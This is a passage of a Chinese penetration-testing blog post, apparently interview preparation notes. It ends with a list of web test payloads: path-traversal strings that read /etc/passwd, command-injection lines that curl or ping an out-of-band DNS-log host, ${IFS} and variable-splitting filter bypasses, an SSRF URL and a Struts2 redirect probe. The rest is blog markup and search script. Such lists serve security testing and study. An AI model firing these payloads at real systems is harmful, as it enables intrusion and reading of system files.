class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.jpg</span><br><span class="line">/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00.html</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>[命令执行漏洞]</p>
+<ul>
+<li><p>[常规检测]</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link</span><br><span class="line"> | curl [random].test.dnslog.link</span><br><span class="line"> | ping -n 2 [random].test.dnslog.link [Windows]</span><br><span class="line"> | ping -c 2 [random].test.dnslog.link  [Linux]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>[绕过检测]</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;curl [random].test.dnslog.link#</span><br><span class="line"> | curl [random].test.dnslog.link#</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link</span><br><span class="line">%20|%20curl%20[random].test.dnslog.link#</span><br><span class="line">%20|%20ping%20-n%202%20[random].test.dnslog.link</span><br><span class="line">%20|%20ping%20-c%202%20[random].test.dnslog.link#</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b -$c $d [random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b [random].test.dnslog.link#</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;curl$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">$&#123;IFS&#125;|$&#123;IFS&#125;ping$&#123;IFS&#125;-c$&#123;IFS&#125;2$&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=p;b=ing;c=c;d=2;$a$b&#123;IFS&#125;-$c&#123;IFS&#125;$d&#123;IFS&#125;[random].test.dnslog.link</span><br><span class="line">a=c;b=url;$a$b&#123;IFS&#125;[random].test.dnslog.link#</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>[ssrf漏洞]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[random].test.dnslog.link/</span><br></pre></td></tr></table></figure>
+<p>[strust2命令执行]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:http://[random].test.dnslog.link/%25&#123;3*4&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    离沫凌天๓
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html" title="安服问题">https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Interview/" rel="tag"><i class="fa fa-tag"></i> Interview</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/note/2020/undefined30/868037e0.html" rel="next" title="Nmap常用参数">
+                <i class="fa fa-chevron-left"></i> Nmap常用参数
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/note/2020/undefined01/35d3b1d4.html" rel="prev" title="渗透测试基础">
+                渗透测试基础 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="离沫凌天๓">
+            
+              <p class="site-author-name" itemprop="name">离沫凌天๓</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试基本流程"><span class="nav-number">1.</span> <span class="nav-text">渗透测试基本流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap的运行机理"><span class="nav-number">2.</span> <span class="nav-text">sqlmap的运行机理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#htaccess利用"><span class="nav-number">3.</span> <span class="nav-text">.htaccess利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入原理及防御"><span class="nav-number">4.</span> <span class="nav-text">sql注入原理及防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">5.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞"><span class="nav-number">6.</span> <span class="nav-text">XSS漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-number">7.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">8.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">9.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用web漏洞测试的payload整理"><span class="nav-number">9.1.</span> <span class="nav-text">常用web漏洞测试的payload整理</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离沫凌天๓</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+<div class="busuanzi-count">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+    来访人数：<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+    访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+    全站字数：<span class="post-count">115.8k</span>
+    </span>
+</div>
+
+
+
+
+
+<div class="BbeiAn-info">
+   	<!--津ICP备  -->
+    <a target="_blank" href="http://www.beian.miit.gov.cn/" style="color:#f0d784" rel="nofollow">津ICP备18005284</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011102000578" style="color:#f0d784;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">津公网安备12011102000578号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
+</div>
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<!-- 在网页底部添加网站运行时间 -->
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/21/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "Run for "+dnum+" Days ";
+        document.getElementById("times").innerHTML = hnum + " Hours " + mnum + " m " + snum + " s";
+    }
+setInterval("createtime()",250);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+</body>
+</html>
